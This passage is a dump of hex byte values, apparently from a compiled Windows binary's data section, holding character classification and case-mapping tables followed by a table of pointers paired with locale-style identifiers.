0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x28, 0x0, 0x28, 0x0, 0x28, 0x0, 0x28, 0x0, 0x28, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x20, 0x0, 0x48, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x84, 0x0, 0x84, 0x0, 0x84, 0x0, 0x84, 0x0, 0x84, 0x0, 0x84, 0x0, 0x84, 0x0, 0x84, 0x0, 0x84, 0x0, 0x84, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x81, 0x0, 0x81, 0x0, 0x81, 0x0, 0x81, 0x0, 0x81, 0x0, 0x81, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x82, 0x0, 0x82, 0x0, 0x82, 0x0, 0x82, 0x0, 0x82, 0x0, 0x82, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x2, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x10, 0x0, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff, 0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff, 0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x11, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x12, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x13, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x15, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x16, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x19, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x28, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x21, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x22, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x23, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x25, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x26, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x29, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x36, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x37, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x38, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x39, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x43, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x44, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x46, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x47, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x49, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x56, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x57, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x2, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x2a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x10, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x11, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x12, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x13, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x14, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x15, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x16, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x18, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x19, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1a, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1b, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1e, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1f, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x21, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x2b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x22, 